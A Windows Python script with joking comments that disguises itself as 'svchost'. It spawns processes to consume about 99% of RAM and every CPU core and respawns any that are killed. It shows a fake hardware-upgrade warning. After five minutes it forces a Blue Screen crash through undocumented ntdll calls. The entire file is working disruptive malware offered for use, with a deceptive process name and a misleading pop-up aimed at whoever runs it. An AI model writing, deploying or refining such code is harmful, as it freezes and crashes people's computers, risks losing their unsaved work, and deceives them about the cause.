import os
import ctypes
import time
import multiprocessing
import threading
import logging
import random
import win32con
import win32gui
import win32api
import win32clipboard

# ---------------- CONFIGURATION (a.k.a. the Control Panel of Doom) ----------------
# 🕵️‍♂️ Give your script a disguise like it's sneaking into the Pentagon
SCRIPT_NAME = "svchost"  # Suggestions: 'chrome', 'explorer', or 'DefinitelyNotMalware.exe'

# 🧠 How greedy should we get? Percentage of total RAM to eat like Pac-Man
RAM_TARGET_PERCENT = 99  # 100% = your system cries in binary

# 🍕 Size of RAM chunks per process, in MB. Bigger = fewer but heavier hogs
RAM_WORKER_CHUNK_MB = 200  # Or crank it to 512MB and watch the world burn

# 🔥 Number of CPU cores to abuse like you're mining Dogecoin on a calculator
CPU_WORKERS = multiprocessing.cpu_count()  # Or manually pick your poison

# 💣 Countdown to doom. Time in minutes before system-triggered self-destruction
CRASH_TIMER_MINUTES = 5  # Set to 0 to go soft... but why would you?

# 📜 Toggle logs because even chaos deserves documentation
ENABLE_LOGGING = True

# 🎹 Hotkey combo ID (CTRL+ALT+P). It's the "oh crap" button
HOTKEY_ID = 1

# ---------------- LOGGING ----------------
if ENABLE_LOGGING:
    log_file = os.path.join(os.path.dirname(__file__), 'svchost_log.txt')
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler()
        ]
    )
    logging.info(f"[{SCRIPT_NAME}] Logger booted like a caffeinated penguin")

# ---------------- GLOBAL STATE (We live here now) ----------------
ram_processes = []
cpu_processes = []
is_paused = False
has_warned = False
crash_triggered = False
hogging_started = None

# ---------------- RAM HOGGING (aka Eat Pray Lag) ----------------
def ram_hog_worker(size_mb):
    try:
        chunk = bytearray(size_mb * 1024 * 1024)
        while True:
            for i in range(0, len(chunk), 4096):
                chunk[i] = (chunk[i] + 1) % 256  # Keep the OS from paging it out like a nosy ex
            time.sleep(0.05)
    except Exception as e:
        logging.error(f"[RAM Worker] Had an oopsie: {e}")

def get_total_ram_mb():
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [
            ("dwLength", ctypes.c_ulong),
            ("dwMemoryLoad", ctypes.c_ulong),
            ("ullTotalPhys", ctypes.c_ulonglong),
            ("ullAvailPhys", ctypes.c_ulonglong),
            ("ullTotalPageFile", ctypes.c_ulonglong),
            ("ullAvailPageFile", ctypes.c_ulonglong),
            ("ullTotalVirtual", ctypes.c_ulonglong),
            ("ullAvailVirtual", ctypes.c_ulonglong),
            ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
        ]
    memory_status = MEMORYSTATUSEX()
    memory_status.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memory_status))
    return memory_status.ullTotalPhys / (1024 * 1024)

def spawn_ram_hogs():
    global hogging_started
    total_ram = get_total_ram_mb()
    target_ram = (total_ram * RAM_TARGET_PERCENT) / 100
    num_instances = int(target_ram / RAM_WORKER_CHUNK_MB)
    logging.info(f"[RAM] Targeting {target_ram:.0f}MB across {num_instances} gluttonous goblins")

    for _ in range(num_instances):
        p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
        p.daemon = True
        p.start()
        ram_processes.append(p)

    threading.Thread(target=monitor_ram_processes, daemon=True).start()
    hogging_started = time.time()

def monitor_ram_processes():
    while True:
        if not is_paused:
            for i, p in enumerate(ram_processes):
                if not p.is_alive():
                    logging.warning("[RAM] Goblin down! Respawning...")
                    new_p = multiprocessing.Process(target=ram_hog_worker, args=(RAM_WORKER_CHUNK_MB,))
                    new_p.daemon = True
                    new_p.start()
                    ram_processes[i] = new_p
        time.sleep(1)

# ---------------- CPU HOGGING (One core to rule them all) ----------------
def cpu_hog_worker():
    x = 0.0001
    while True:
        x = x ** 1.000001  # Useless math = max heat

def spawn_cpu_hogs():
    for _ in range(CPU_WORKERS):
        p = multiprocessing.Process(target=cpu_hog_worker)
        p.daemon = True
        p.start()
        cpu_processes.append(p)
    logging.info(f"[CPU] Deployed {CPU_WORKERS} miners of mayhem")
    threading.Thread(target=monitor_cpu_processes, daemon=True).start()

def monitor_cpu_processes():
    while True:
        if not is_paused:
            for i, p in enumerate(cpu_processes):
                if not p.is_alive():
                    logging.warning("[CPU] Core died. Frankenstein mode activated.")
                    new_p = multiprocessing.Process(target=cpu_hog_worker)
                    new_p.daemon = True
                    new_p.start()
                    cpu_processes[i] = new_p
        time.sleep(1)

# ---------------- GLOBAL HOTKEY (Emergency eject: CTRL+ALT+P) ----------------
def toggle_pause():
    global is_paused, hogging_started
    is_paused = not is_paused
    if is_paused:
        logging.info("[Control] PAUSE engaged. Mercy granted.")
        for p in ram_processes + cpu_processes:
            if p.is_alive():
                p.terminate()
        ram_processes.clear()
        cpu_processes.clear()
        hogging_started = None
    else:
        logging.info("[Control] Back to the trenches. Hogging resumed.")
        spawn_ram_hogs()
        spawn_cpu_hogs()

def handle_hotkeys():
    def wnd_proc(hWnd, msg, wParam, lParam):
        if msg == win32con.WM_HOTKEY and wParam == HOTKEY_ID:
            toggle_pause()
        return win32gui.DefWindowProc(hWnd, msg, wParam, lParam)

    wc = win32gui.WNDCLASS()
    hinst = wc.hInstance = win32api.GetModuleHandle(None)
    wc.lpszClassName = "HotkeyListener"
    wc.lpfnWndProc = wnd_proc
    class_atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(wc.lpszClassName, "", 0, 0, 0, 0, 0, 0, 0, hinst, None)

    win32gui.RegisterHotKey(hwnd, HOTKEY_ID, win32con.MOD_CONTROL | win32con.MOD_ALT, 0x50)  # P key
    logging.info("[Hotkeys] CTRL+ALT+P bound to global panic button")

    win32gui.PumpMessages()

# ---------------- PRIORITY MODE (We go fast. Like Sonic.) ----------------
def raise_priority():
    try:
        ctypes.windll.kernel32.SetPriorityClass(
            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000080  # HIGH_PRIORITY_CLASS
        )
        logging.info("[System] HIGH priority acquired. Hold my beer.")
    except Exception as e:
        logging.warning(f"[System] Could not raise priority: {e}")

# ---------------- FRIENDLY REMINDER (aka pop-up of doom) ----------------
def warning_loop():
    global has_warned
    while True:
        if not is_paused and not has_warned:
            ctypes.windll.user32.MessageBoxW(0,
                "Your PC is running low on resources. A hardware upgrade is recommended.",
                "Hardware Performance Warning", 0x30)
            has_warned = True
        time.sleep(5)

# ---------------- SELF-DESTRUCT INITIATOR (Hydrogen bomb, digital edition) ----------------
def crash_timer():
    global crash_triggered
    while True:
        if hogging_started and not is_paused:
            elapsed = time.time() - hogging_started
            if elapsed > CRASH_TIMER_MINUTES * 60 and not crash_triggered:
                crash_triggered = True
                logging.warning("[CRASH] BOOM scheduled. Initiating fail spectacularly.")
                trigger_bsod()
        time.sleep(5)

def trigger_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_long()))
        ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
    except Exception as e:
        logging.error(f"[CRASH] BSOD failed. Drama canceled: {e}")

# ---------------- MAIN ENGINE ROOM (Where chaos is born) ----------------
if __name__ == '__main__':
    multiprocessing.freeze_support()
    ctypes.windll.kernel32.SetConsoleTitleW(SCRIPT_NAME)  # Give the console a CIA alias
    raise_priority()
    threading.Thread(target=handle_hotkeys, daemon=True).start()
    spawn_ram_hogs()
    spawn_cpu_hogs()
    threading.Thread(target=warning_loop, daemon=True).start()
    threading.Thread(target=crash_timer, daemon=True).start()
    while True:
        time.sleep(1)
